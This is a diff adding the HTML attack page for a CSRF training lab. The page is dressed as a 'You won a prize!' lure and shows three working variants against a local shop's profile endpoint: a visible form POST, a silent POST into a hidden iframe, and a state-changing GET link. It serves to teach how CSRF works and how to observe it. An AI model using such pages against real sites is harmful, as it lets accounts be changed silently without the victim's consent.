@@ -1,0 +1,62 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+<title>You won a prize! (CSRF lab)</title><link rel="stylesheet" href="/style.css"></head>
+<body>
+<div class="ribbon">Lab 2 attack page. Origin: <code id="me"></code>. It only changes the display name on your local training account.</div>
+<main>
+  <h1>Congratulations!</h1>
+  <p>You are this hour's lucky visitor. Pick how you would like to claim your prize.</p>
+
+  <div class="card plain">
+    <label for="name">Display name the attack will set:</label><br>
+    <input type="text" id="name" value="Hacked via CSRF">
+  </div>
+
+  <div class="card">
+    <h2 style="margin-top:0">Variant A: visible form POST</h2>
+    <p>A normal cross-origin HTML form. You land on the shop's account page afterwards, so the result is easy to see.</p>
+    <form id="formA" method="post"><input type="hidden" name="display_name"><button type="submit">Claim prize</button></form>
+  </div>
+
+  <div class="card">
+    <h2 style="margin-top:0">Variant B: silent POST in a hidden iframe</h2>
+    <p>Same request, but the response goes to an invisible frame, so the victim sees nothing happen.</p>
+    <form id="formB" method="post" target="sink"><input type="hidden" name="display_name"><button type="submit">Claim silently</button></form>
+    <iframe class="silent" name="sink" title="Hidden response sink"></iframe>
+    <p class="note" id="silentNote"></p>
+  </div>
+
+  <div class="card">
+    <h2 style="margin-top:0">Variant C: state-changing GET link</h2>
+    <p>A plain link. <code>SameSite=Lax</code> cookies still accompany top-level GET navigations, which is why state must never change on GET.</p>
+    <a class="btn" id="linkC" href="#">Claim with one click</a>
+  </div>
+
+  <div class="card plain">
+    <h2 style="margin-top:0">What to observe</h2>
+    <ul class="note">
+      <li>DevTools → Network → the request's <code>Origin</code>, <code>Sec-Fetch-Site</code> and whether <code>Cookie</code> was sent.</li>
+      <li>Security Lab → Lab 2 → the captured request, with the before and after values.</li>
+      <li>This page cannot read the shop's response. CSRF is a write-only attack.</li>
+    </ul>
+  </div>
+</main>
+<script src="/config.js"></script>
+<script>
+  document.getElementById('me').textContent = location.origin;
+  var endpoint = window.TARGET + '/api/profile';
+  var input = document.getElementById('name');
+  ['formA', 'formB'].forEach(function (id) {
+    var form = document.getElementById(id);
+    form.action = endpoint;
+    form.addEventListener('submit', function () {
+      form.elements.display_name.value = input.value;
+      if (id === 'formB') document.getElementById('silentNote').textContent = 'Request sent in the background. Check Lab 2 in the Security Lab to see whether it worked.';
+    });
+  });
+  var link = document.getElementById('linkC');
+  function syncLink() { link.href = window.TARGET + '/api/profile/quick-update?display_name=' + encodeURIComponent(input.value); }
+  input.addEventListener('input', syncLink);
+  syncLink();
+</script>
+</body></html>
